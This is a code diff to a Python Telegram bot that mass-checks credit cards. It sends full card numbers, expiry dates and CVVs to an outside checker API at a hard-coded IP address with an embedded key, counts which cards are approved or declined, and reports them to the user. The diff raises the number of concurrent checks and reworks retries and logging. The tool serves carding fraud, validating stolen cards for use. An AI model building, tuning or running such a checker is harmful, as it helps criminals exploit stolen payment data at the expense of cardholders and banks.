@@ -1429,104 +1429,116 @@ import time
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 import random
+import logging
+
+# Set up logging for better error tracking
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def parse_api_response(raw_text):
-    """Safely parse API response, even if extra text or multiple JSON objects are present."""
+    """
+    Safely parse API response, handling extra data by extracting the first valid JSON.
+    """
     raw_text = raw_text.strip()
     if not raw_text:
         raise ValueError("Empty response")
     try:
         return json.loads(raw_text)
-    except json.JSONDecodeError:
-        # Extract first valid JSON object using regex
-        match = re.search(r'\{(?:[^{}]|(?R))*\}', raw_text)
+    except json.JSONDecodeError as e:
+        # Use regex to find the first valid JSON object
+        # This handles cases where extra text or another JSON object is present
+        match = re.search(r'\{.*?\}', raw_text, re.DOTALL)
         if match:
-            return json.loads(match.group(0))
+            try:
+                # Attempt to load the extracted part
+                return json.loads(match.group(0))
+            except json.JSONDecodeError:
+                # If the extracted part is still invalid, raise the original error
+                raise e
         else:
-            raise ValueError(f"Invalid JSON: {raw_text[:100]}")
+            raise ValueError(f"Invalid JSON: No JSON object found in response.")
 
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
+    """
+    Asynchronously checks a list of credit cards against an API.
+    
+    Args:
+        cards_to_check (list): A list of credit card strings in the format "CC|MM|YY|CVV".
+        user_id (int): Telegram user ID.
+        user_first_name (str): Telegram user's first name.
+        processing_msg (telegram.Message): The message object to edit with status updates.
+        start_time (float): The timestamp when processing began.
+    """
     approved_count = declined_count = checked_count = error_count = 0
     results = []
     total_cards = len(cards_to_check)
-
-    semaphore = asyncio.Semaphore(3)  # limit concurrent requests
+    update_interval = 3  # seconds
+    last_update = time.time()
+    
+    semaphore = asyncio.Semaphore(10) # Limit concurrent requests to prevent overload
 
     async def check_card(session, raw):
         nonlocal approved_count, declined_count, checked_count, error_count
 
+        parts = raw.split("|")
+        if len(parts) != 4:
+            checked_count += 1
+            error_count += 1
+            return {"status": f"❌ Invalid card format: `{raw}`", "card": raw}
+
+        # Normalize year (2-digit) and format card string for URL
+        cc_normalized = f"{parts[0]}|{parts[1]}|{parts[2][-2:]}|{parts[3]}"
+        api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
+
+        max_retries = 3
+        
         async with semaphore:
-            parts = raw.split("|")
-            if len(parts) != 4:
-                checked_count += 1
-                error_count += 1
-                return f"❌ Invalid card format: `{raw}`"
-
-            # Normalize year
-            if len(parts[2]) == 4:
-                parts[2] = parts[2][-2:]
-            cc_normalized = "|".join(parts)
-
-            api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
-
-            max_retries = 5
-            retry_delay = 1
-
             for attempt in range(max_retries):
                 try:
-                    # small random delay to prevent API overload
-                    await asyncio.sleep(random.uniform(0.2, 0.6))
+                    # Small random delay to prevent API overload
+                    await asyncio.sleep(random.uniform(0.1, 0.4))
 
-                    async with session.get(api_url, timeout=50) as resp:
+                    async with session.get(api_url, timeout=30) as resp:
                         if resp.status != 200:
-                            raise Exception(f"HTTP {resp.status}")
+                            raise aiohttp.ClientError(f"HTTP Error {resp.status}")
+                        
+                        raw_text = await resp.text()
+                        data = parse_api_response(raw_text)
+                        
+                        # Process response
+                        api_status = data.get("status", "Unknown")
+                        
+                        if "approved" in api_status.lower():
+                            approved_count += 1
+                            result_status = f"✅ Card Approved: {api_status}"
+                        elif "declined" in api_status.lower() or "incorrect" in api_status.lower():
+                            declined_count += 1
+                            result_status = f"❌ Card Declined: {api_status}"
+                        else:
+                            error_count += 1
+                            result_status = f"⚠️ Unknown Status: {api_status}"
+                            logging.warning(f"Unknown status received: {api_status} for card {cc_normalized}")
+                            
+                        checked_count += 1
+                        return {"status": result_status, "card": cc_normalized}
 
-                        raw_text = (await resp.text()).strip()
-                        if not raw_text:
-                            raise ValueError("Empty response")
-
-                        try:
-                            data = parse_api_response(raw_text)
-                            break  # successfully parsed
-                        except Exception as e:
-                            if attempt < max_retries - 1:
-                                await asyncio.sleep(retry_delay)
-                                continue
-                            else:
-                                raise e
-                except Exception as e:
+                except (aiohttp.ClientError, asyncio.TimeoutError, ValueError, json.JSONDecodeError) as e:
+                    logging.error(f"Attempt {attempt + 1}/{max_retries} failed for card {cc_normalized}: {e}")
                     if attempt < max_retries - 1:
-                        await asyncio.sleep(retry_delay)
-                        continue
+                        await asyncio.sleep(random.uniform(2, 5))
                     else:
                         checked_count += 1
                         error_count += 1
-                        return f"❌ API Error for card `{cc_normalized}`: {escape_markdown(str(e), version=2)}"
+                        return {"status": f"❌ API Error: {escape_markdown(str(e), version=2)}", "card": cc_normalized}
 
-            # Extract status and clean text
-            api_response = data.get("status", "Unknown")
-            api_response_clean = re.sub(r'[\U00010000-\U0010ffff]', '', str(api_response)).strip()
-
-            api_response_lower = api_response_clean.lower()
-            if "approved" in api_response_lower:
-                approved_count += 1
-            elif "declined" in api_response_lower or "incorrect" in api_response_lower:
-                declined_count += 1
-
-            checked_count += 1
-
-            return f"`{cc_normalized}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {escape_markdown(api_response_clean, version=2)}"
-
+    # Main coroutine execution
     async with aiohttp.ClientSession() as session:
         tasks = [check_card(session, raw) for raw in cards_to_check]
-        update_interval = 3
-        last_update = time.time()
-
+        
         for coro in asyncio.as_completed(tasks):
-            result = await coro
-            results.append(result)
+            result_dict = await coro
+            results.append(result_dict)
 
-            # Periodic summary update
+            # Periodic update for user feedback
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 current_summary = (
@@ -1536,18 +1548,25 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                     f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
                     f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
                     f"✘ 𝐓𝐢𝐦𝐞↣{round(time.time() - start_time, 2)}s\n"
-                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
+                    f"\n𝗠𝗮𝐬𝐬 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
                 )
+                
+                # Format each result for Telegram markdown
+                result_text = []
+                for res in results:
+                    safe_card = escape_markdown(res['card'], version=2)
+                    safe_status = escape_markdown(res['status'], version=2)
+                    result_text.append(f"`{safe_card}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {safe_status}")
+                
                 try:
                     await processing_msg.edit_text(
-                        escape_markdown(current_summary, version=2) + "\n\n" +
-                        "\n──────── ⸙ ─────────\n".join(results),
+                        current_summary + "\n\n" + "\n──────── ⸙ ─────────\n".join(result_text),
                         parse_mode=ParseMode.MARKDOWN_V2
                     )
-                except Exception:
-                    pass
+                except Exception as e:
+                    logging.error(f"Failed to update Telegram message: {e}")
 
-    # Final summary
+    # Final summary update
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
@@ -1556,14 +1575,22 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
         f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
         f"✘ 𝐓𝐢𝐦𝐞↣{final_time_taken}s\n"
-        f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
+        f"\n𝗠𝗮𝐬𝐬 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
     )
-    await processing_msg.edit_text(
-        escape_markdown(final_summary, version=2) + "\n\n" +
-        "\n──────── ⸙ ─────────\n".join(results) +
-        "\n──────── ⸙ ─────────",
-        parse_mode=ParseMode.MARKDOWN_V2
-    )
+
+    result_text = []
+    for res in results:
+        safe_card = escape_markdown(res['card'], version=2)
+        safe_status = escape_markdown(res['status'], version=2)
+        result_text.append(f"`{safe_card}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {safe_status}")
+
+    try:
+        await processing_msg.edit_text(
+            final_summary + "\n\n" + "\n──────── ⸙ ─────────\n".join(result_text) + "\n──────── ⸙ ─────────",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+    except Exception as e:
+        logging.error(f"Failed to send final Telegram message: {e}")
 
 
 
